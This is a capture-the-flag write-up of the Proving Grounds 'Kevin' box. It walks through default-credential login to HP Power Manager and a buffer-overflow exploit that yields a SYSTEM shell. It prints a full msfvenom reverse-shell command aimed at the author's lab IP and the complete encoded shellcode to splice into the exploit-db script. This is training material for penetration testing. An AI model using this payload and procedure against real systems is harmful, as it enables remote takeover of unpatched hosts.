---
layout: writeup
title: Kevin - Proving Grounds
date: 2024-08-24 13:32:20 +0300
description: A Writeup of the Kevin Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Windows, TJ Null, LainKusunagi]
---

Alrighty, let’s get started with another [Proving Grounds](https://www.offsec.com/labs/) box from TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)as well as LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called Kevin, and it's rated Easy by Proving Grounds and Easy by the community. Hopefully I can validate that rating. As usual, I get started with an nmap scan: 

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
```

So we have a number of open ports here, though only a few of them are realistically going to be exploitable I suspect. I quickly check to see if we can list SMB shares and see if we can log into rpcclient, but we cannot, so I go check out the web page. It looks like there is a web app on port 80 called HP Power Manager:

![Kevin1.png](/assets/images/Kevin/Kevin1.png){: .responsive-image}

There is a potential exploit on [exploit-db](https://www.exploit-db.com/exploits/10099), but I try `admin:admin` first. 

![Kevin2.png](/assets/images/Kevin/Kevin2.png){: .responsive-image}

And we are able to log in. I click around, but can't find anything, though I do find the version is listed as 4.2. 

![Kevin3.png](/assets/images/Kevin/Kevin3.png){: .responsive-image}

At this point I go back to the exploit-db script and copy it into my home folder. When reviewing the script, we see a that we need to replace some shell code with new code so that it calls back to our machine, and we notice this line describing the encoding:

![Kevin4.png](/assets/images/Kevin/Kevin4.png){: .responsive-image}

[This](https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/) from Proving Grounds explains how to generate shellcode in this format, so we do that. We also need to take note that that code needs to be in C format `-f c`, which can be confusing because the exploit is written in python (you can see this if you find it with searchsploit, the format is `.py`). I got stuck here, and wound up trying a bunch of other exploits I found online. The full command is: `msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.45.183 LPORT=80 -e x86/alpha_mixed -f c` which results in this code:

```
"\x89\xe7\xd9\xcf\xd9\x77\xf4\x59\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a"
"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41"
"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"
"\x75\x4a\x49\x69\x6c\x59\x78\x6c\x42\x45\x50\x63\x30\x55"
"\x50\x75\x30\x6e\x69\x49\x75\x35\x61\x6f\x30\x35\x34\x4e"
"\x6b\x46\x30\x36\x50\x4c\x4b\x66\x32\x54\x4c\x6c\x4b\x73"
"\x62\x62\x34\x4e\x6b\x63\x42\x34\x68\x36\x6f\x4c\x77\x62"
"\x6a\x76\x46\x35\x61\x6b\x4f\x4c\x6c\x57\x4c\x55\x31\x31"
"\x6c\x73\x32\x74\x6c\x55\x70\x59\x51\x48\x4f\x36\x6d\x75"
"\x51\x4b\x77\x6a\x42\x49\x62\x53\x62\x56\x37\x6e\x6b\x63"
"\x62\x44\x50\x4c\x4b\x43\x7a\x37\x4c\x6c\x4b\x42\x6c\x56"
"\x71\x73\x48\x4a\x43\x72\x68\x47\x71\x7a\x71\x53\x61\x4e"
"\x6b\x53\x69\x31\x30\x76\x61\x48\x53\x4c\x4b\x63\x79\x75"
"\x48\x38\x63\x34\x7a\x62\x69\x6e\x6b\x50\x34\x6e\x6b\x45"
"\x51\x38\x56\x44\x71\x69\x6f\x6c\x6c\x39\x51\x6a\x6f\x66"
"\x6d\x66\x61\x58\x47\x77\x48\x6d\x30\x43\x45\x5a\x56\x55"
"\x53\x51\x6d\x38\x78\x47\x4b\x31\x6d\x74\x64\x31\x65\x59"
"\x74\x31\x48\x6e\x6b\x52\x78\x57\x54\x37\x71\x38\x53\x52"
"\x46\x6c\x4b\x76\x6c\x42\x6b\x6e\x6b\x52\x78\x45\x4c\x35"
"\x51\x68\x53\x6c\x4b\x47\x74\x4e\x6b\x47\x71\x48\x50\x4f"
"\x79\x67\x34\x31\x34\x66\x44\x63\x6b\x71\x4b\x70\x61\x76"
"\x39\x33\x6a\x46\x31\x59\x6f\x6d\x30\x51\x4f\x43\x6f\x63"
"\x6a\x4c\x4b\x74\x52\x38\x6b\x6e\x6d\x71\x4d\x33\x58\x70"
"\x33\x46\x52\x57\x70\x33\x30\x61\x78\x72\x57\x44\x33\x37"
"\x42\x63\x6f\x61\x44\x72\x48\x52\x6c\x52\x57\x74\x66\x35"
"\x57\x49\x6f\x59\x45\x68\x38\x7a\x30\x55\x51\x35\x50\x37"
"\x70\x54\x69\x49\x54\x50\x54\x50\x50\x55\x38\x71\x39\x4f"
"\x70\x42\x4b\x67\x70\x39\x6f\x59\x45\x46\x30\x62\x70\x42"
"\x70\x66\x30\x63\x70\x62\x70\x71\x50\x42\x70\x71\x78\x48"
"\x6a\x76\x6f\x4b\x6f\x59\x70\x69\x6f\x6b\x65\x4d\x47\x62"
"\x4a\x44\x45\x65\x38\x49\x50\x6f\x58\x74\x6d\x68\x37\x42"
"\x48\x37\x72\x45\x50\x43\x30\x46\x30\x6f\x79\x78\x66\x73"
"\x5a\x36\x70\x62\x76\x51\x47\x35\x38\x6f\x69\x39\x35\x30"
"\x74\x31\x71\x79\x6f\x38\x55\x6f\x75\x39\x50\x72\x54\x56"
"\x6c\x69\x6f\x42\x6e\x67\x78\x51\x65\x4a\x4c\x63\x58\x4a"
"\x50\x68\x35\x4c\x62\x66\x36\x49\x6f\x4e\x35\x72\x48\x65"
"\x33\x50\x6d\x71\x74\x55\x50\x4b\x39\x39\x73\x73\x67\x30"
"\x57\x46\x37\x35\x61\x59\x66\x43\x5a\x44\x52\x30\x59\x73"
"\x66\x79\x72\x4b\x4d\x31\x76\x38\x47\x63\x74\x75\x74\x75"
"\x6c\x57\x71\x57\x71\x6e\x6d\x50\x44\x76\x44\x32\x30\x7a"
"\x66\x65\x50\x43\x74\x56\x34\x46\x30\x53\x66\x71\x46\x62"
"\x76\x33\x76\x32\x76\x30\x4e\x61\x46\x36\x36\x31\x43\x73"
"\x66\x52\x48\x31\x69\x6a\x6c\x55\x6f\x6b\x36\x4b\x4f\x4a"
"\x75\x6f\x79\x49\x70\x62\x6e\x31\x46\x51\x56\x49\x6f\x50"
"\x30\x32\x48\x75\x58\x6d\x57\x37\x6d\x31\x70\x4b\x4f\x68"
"\x55\x6f\x4b\x48\x70\x4f\x45\x6c\x62\x52\x76\x71\x78\x79"
"\x36\x6a\x35\x6f\x4d\x4f\x6d\x59\x6f\x4a\x75\x67\x4c\x55"
"\x56\x61\x6c\x54\x4a\x6d\x50\x79\x6b\x59\x70\x72\x55\x76"
"\x65\x4f\x4b\x31\x57\x45\x43\x70\x72\x62\x4f\x51\x7a\x35"
"\x50\x61\x43\x6b\x4f\x6a\x75\x41\x41"
```

So we add that to directly below "n00bn00b" (line 42). Note, the output of the msfvenom command includes a `;` - do not include this in the exploit. After that, we run the command `python2 10099.py 192.168.157.45`. 

*Note that this is a buffer overflow exploit, and if you use the wrong port or something, you will have to revert the machine because the exploit can only be run once. This is often the case for Buffer Overflow exploits.*

And it takes a while (under a minute), but eventually we get a shell. 

![Kevin5.png](/assets/images/Kevin/Kevin5.png){: .responsive-image}

And it's already a `NT Authority\System` shell, so we grab `proof.txt` and we're done. 

#### Remediation Steps
Update the HP Power Manager instance to a non-vulnerable version, and furthermore have a different account running the application, so that in the event that it does get exploited, it won't be a admin shell. 

#### Lessons Learned
It's a pretty simple box if you do it right, but it actually took a while to figure some things out. You need to also understand what kind of shell code you are generating. In the exploit-db script, you need to generate shell code in C, even though the exploit itself (and the file in searchsploit) is written in python. That can be confusing. 

The last thing I would say is that I tried some other exploits I found online, and I couldn't get any of them working. I even saw a writeup that linked them ([python2](https://github.com/Muhammd/HP-Power-Manager) and [python3](https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3)) and said they used them. I tried for a while after I completed the box, but I was never able to do it, maybe because they use bind shells, which may have been copied from a metasploit exploit. Regardless, it was frustrating for an easy box. Like I said, if you get everything right the first time, this box shouldn't take long, but it can drag. 
